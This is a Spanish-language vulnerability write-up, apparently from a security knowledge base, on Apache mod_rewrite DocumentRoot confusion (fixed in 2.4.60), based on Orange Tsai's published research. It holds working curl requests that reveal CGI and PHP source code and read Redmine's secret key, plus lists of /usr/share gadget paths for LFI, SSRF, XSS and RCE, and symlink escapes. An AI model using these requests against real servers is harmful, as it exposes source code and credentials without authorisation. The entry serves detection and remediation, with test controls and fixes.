---
clase: info-disclosure
tech: apache-mod-rewrite
cwe: CWE-540
cvss: 8.6 # [derivado] revelacion de codigo fuente y acceso a ficheros de configuracion; Apache 2.4.60
payload: |
  # CAUSA RAIZ, cita LITERAL de la fuente:
  #   'For any[1] RewriteRule, Apache HTTP Server always tries to open both the path
  #    with DocumentRoot and without it!'
  #   ([1] = situada en Server Config o en un bloque VirtualHost)
  #
  # Regla vulnerable usada en las demostraciones - LITERAL:
  RewriteEngine On
  RewriteRule  "^/html/(.*)$"  "/$1.html"
  #
  # ---- REVELACION DE CODIGO FUENTE CGI - LITERALES de la fuente ----
  $ curl http://server/cgi-bin/download.cgi
   # the processed result from download.cgi
  $ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
   # #!/usr/bin/perl
   # use CGI;
   # ...
   # # the source code of download.cgi
  #
  # ---- REVELACION DE CODIGO FUENTE PHP (cambiando de VirtualHost) - LITERALES ----
  # www.local permite PHP; static.local solo estaticos.
  $ curl http://www.local/config.php
   # the processed result (empty) from config.php
  $ curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
   # the source code of config.php
  #
  # ---- GADGETS LOCALES ----
  # Precondicion: la denegacion por defecto de la raiz - LITERAL:
  <Directory />
      AllowOverride None
      Require all denied
  </Directory>
  # Pero Debian y Ubuntu permiten /usr/share - LITERAL:
  <Directory /usr/share>
      AllowOverride None
      Require all granted
  </Directory>
  #
  # Rutas de gadgets LITERALES de la fuente, por efecto:
  #   Informacion:  /usr/share/doc/websocketd/examples/php/   (dump-env.php)
  #                 /usr/share/nginx/html/
  #                 /usr/share/jetty9/etc/
  #                 /usr/share/jetty9/webapps/
  #   XSS:          /usr/share/libreoffice/help/help.html
  #   LFI:          /usr/share/doc/libphp-jpgraph-examples/examples/show-source.php
  #                 /usr/share/javascript/jquery-jfeed/proxy.php
  #                 /usr/share/moodle/mod/assignment/type/wims/getcsv.php
  #   SSRF:         /usr/share/php/magpierss/scripts/magpie_debug.php
  #   RCE:          PHPUnit antiguo (via CVE-2017-9841, de terceros) y phpLiteAdmin,
  #                 que segun la fuente 'by default has the password admin'
  #
  # ---- JAILBREAK: salir de /usr/share por ENLACES SIMBOLICOS ----
  # Config por defecto que lo permite - LITERAL (notese FollowSymLinks):
  <Directory />
      Options FollowSymLinks
      AllowOverride None
      Require all denied
  </Directory>
  # Enlaces LITERALES de la fuente:
  #   /usr/share/cacti/site/        -> /var/log/cacti/
  #   /usr/share/solr/data/         -> /var/lib/solr/data
  #   /usr/share/solr/conf/         -> /etc/solr/conf/
  #   /usr/share/mediawiki/config/  -> /var/lib/mediawiki/config/
  #   /usr/share/simplesamlphp/config/ -> /etc/simplesamlphp/
  #
  # Caso Redmine - comandos LITERALES de la fuente:
  $ file /usr/share/redmine/instances/
   symbolic link to /var/lib/redmine/
  $ file /var/lib/redmine/config/
   symbolic link to /etc/redmine/default/
  $ ls /etc/redmine/default/
   database.yml    secret_key.txt
  # Payload LITERAL:
  $ curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
  #
  # ADVERTENCIA: la prosa de la fuente dice que 'default/config/' apunta a
  # /etc/redmine/default/, pero su comando usa /var/lib/redmine/config/. La fuente es
  # INCOHERENTE aqui. No elijo una lectura.
precondicion: "Apache con una RewriteRule situada en Server Config o en un bloque VirtualHost (no en .htaccess). La fuente afirma que para CUALQUIER regla asi, Apache intenta abrir la ruta con y sin DocumentRoot. Para los gadgets locales hace falta ademas que /usr/share este permitido, que es el valor por defecto en Debian y Ubuntu."
como_se_descubre: |
  Señal en recon: cualquier aplicacion con mod_rewrite. La sonda es añadir una ruta
  absoluta del sistema de ficheros tras el prefijo de la regla, mas '%3F' al final para
  truncar el sufijo que la regla añade.
  La parte mas instructiva son los GADGETS LOCALES, y la leccion es de modelo de
  amenaza: el atacante no necesita que la APLICACION tenga ningun fallo. Le basta con
  lo que los PAQUETES DE LA DISTRIBUCION dejaron en /usr/share — ejemplos de
  librerias, ficheros de ayuda, scripts de depuracion. Todo codigo que nadie instalo a
  proposito y que nadie audita.
  Y el jailbreak lo amplia: 'FollowSymLinks' esta activo por defecto, y varios paquetes
  dejan enlaces desde /usr/share hacia /etc y /var. Asi que 'permitir solo /usr/share'
  no acota nada.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: curl http://server/html/usr/lib/cgi-bin/download.cgi%3F -> codigo fuente
  # B: curl http://server/cgi-bin/download.cgi                 -> resultado PROCESADO
  # El par A/B es el informe: el mismo fichero, ejecutado o revelado segun la ruta. No
  # hay que explicar ninguna anomalia.
  # C: curl http://server/html/usr/lib/cgi-bin/noexiste.cgi%3F -> 404, no un 200 vacio
  # El control C descarta que el servidor devuelva algo generico con ese patron.
mata: |
  - Apache 2.4.60 o posterior.
  - La RewriteRule esta en .htaccess en lugar de Server Config o VirtualHost (la
    propia fuente acota el alcance a esas dos ubicaciones).
  - /usr/share NO permitido -> mueren los gadgets locales.
  - 'Options -FollowSymLinks' -> muere el jailbreak por enlaces simbolicos.
  - C devuelve 200 -> el servidor sirve algo generico y A no prueba revelacion.
fuente: "https://blog.orange.tw/posts/2024-08-confusion-attacks-en/ (Orange Tsai, 2024-08-09). Presentado en Black Hat USA 2024, HITCON y OrangeCon. Tecnica nº1 de 2024. Reglas, comandos y rutas de gadgets literales. Corregido en el lote de Apache 2.4.60 (2024-07-01). CVE-2024-38475 ('weakness in mod_rewrite when first segment of substitution matches filesystem path') encaja por descripcion, pero la fuente NO lo mapea explicitamente a esta seccion. ADVERTENCIA: varias demos son solo capturas (phpinfo de Davical, el XSS de LibreOffice, la lectura de /etc/passwd por proxy.php, la captura de Redmine) y no se reconstruyen."
confianza: alta
fecha: 2026-11-02
---
# [INFO-DISCLOSURE] DocumentRoot confusion en Apache — y los gadgets que instaló la distribución

## Principio
Cita literal de la causa raíz:

> *"For any `RewriteRule`, Apache HTTP Server always tries to open both the path with
> DocumentRoot and without it!"*

Es decir, una regla de reescritura abre dos candidatos: la ruta relativa al `DocumentRoot`
y **la misma ruta como absoluta del sistema de ficheros**. El atacante elige la segunda.

Regla vulnerable de las demostraciones:

```apache
RewriteEngine On
RewriteRule  "^/html/(.*)$"  "/$1.html"
```

## Revelación de código fuente
El mismo fichero, ejecutado o revelado según cómo se pida:

```bash
$ curl http://server/cgi-bin/download.cgi
 # the processed result from download.cgi
$ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 # #!/usr/bin/perl
 # use CGI;
 # # the source code of download.cgi
```

El `%3F` final trunca el `.html` que la regla añadiría. Y para PHP, cambiando de
VirtualHost a uno que no tenga el handler de PHP:

```bash
$ curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"
 # the source code of config.php
```

## La parte que cambia el modelo de amenaza: gadgets locales
Apache deniega la raíz por defecto:

```apache
<Directory />
    AllowOverride None
    Require all denied
</Directory>
```

Pero Debian y Ubuntu **permiten `/usr/share`**:

```apache
<Directory /usr/share>
    AllowOverride None
    Require all granted
</Directory>
```

Y lo que hay en `/usr/share` lo pusieron los paquetes de la distribución, no el
administrador:

| Efecto | Ruta |
|---|---|
| Información | `/usr/share/doc/websocketd/examples/php/`, `/usr/share/jetty9/etc/` |
| XSS | `/usr/share/libreoffice/help/help.html` |
| LFI | `/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php`, `/usr/share/javascript/jquery-jfeed/proxy.php` |
| SSRF | `/usr/share/php/magpierss/scripts/magpie_debug.php` |
| RCE | PHPUnit antiguo (CVE-2017-9841, de terceros) y phpLiteAdmin, que *"by default has the password `admin`"* |

**El atacante no necesita que la aplicación tenga ningún fallo.** Le basta con los
ejemplos de librerías, ficheros de ayuda y scripts de depuración que nadie instaló a
propósito y que nadie audita. Un servidor con una aplicación perfecta y los paquetes por
defecto es explotable.

## El jailbreak hace inútil la restricción
`FollowSymLinks` está activo en la configuración por defecto:

```apache
<Directory />
    Options FollowSymLinks
    AllowOverride None
    Require all denied
</Directory>
```

Y varios paquetes dejan enlaces desde `/usr/share` hacia `/etc` y `/var`:

```
/usr/share/cacti/site/           -> /var/log/cacti/
/usr/share/solr/conf/            -> /etc/solr/conf/
/usr/share/mediawiki/config/     -> /var/lib/mediawiki/config/
/usr/share/simplesamlphp/config/ -> /etc/simplesamlphp/
```

Así que "permitir solo `/usr/share`" no acota nada. El caso de Redmine llega a la clave
secreta:

```bash
$ curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f
```

**Advertencia:** la prosa de la fuente dice que `default/config/` apunta a
`/etc/redmine/default/`, pero su comando usa `/var/lib/redmine/config/`. La fuente es
incoherente ahí y no elijo una lectura.

## El informe son dos peticiones
El mismo fichero CGI, ejecutado por su ruta normal y revelado por la ruta del sistema de
ficheros. No hay nada que interpretar.

## Impacto
Revelación de código fuente de CGI y PHP —con las credenciales que contengan—, lectura de
ficheros de configuración vía enlaces simbólicos, y una escalera de gadgets que llega hasta
RCE a través de software que el administrador no sabe que está sirviendo.

## Remediación
Corregido en el lote de **Apache 2.4.60** (2024-07-01), con la advertencia de la fuente de
que los arreglos son incompatibles hacia atrás.

`# [derivado]`: `Options -FollowSymLinks` cierra el jailbreak, y restringir `/usr/share`
cierra los gadgets. Pero la lección que escala es de inventario: **hay que saber qué
ficheros sirve el servidor, no solo qué ficheros escribió el equipo.**
